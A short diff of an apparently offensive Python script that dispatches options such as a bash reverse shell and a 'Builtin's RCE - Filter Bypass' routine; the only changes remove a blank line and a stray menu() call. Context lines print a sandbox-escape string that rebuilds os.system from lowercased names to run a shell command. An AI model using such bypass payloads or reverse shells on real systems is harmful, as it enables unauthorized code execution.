@@ -188,7 +188,6 @@ def privesc():
     builtins_filter_bypass =    "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat ok.txt')";
     print(builtins_filter_bypass)
 
-
 try:
     if sys.argv[1] == "1a":
         ReverseShellBash(sys.argv[2], sys.argv[3], sys.argv[4])
@@ -215,7 +214,6 @@ try:
     elif sys.argv[1] == "2a":
         print("Builtin's RCE - Filter Bypass:")
         privesc()
-menu()
    # elif sys.arv[1] == "--help":
    #     menu()
 except:
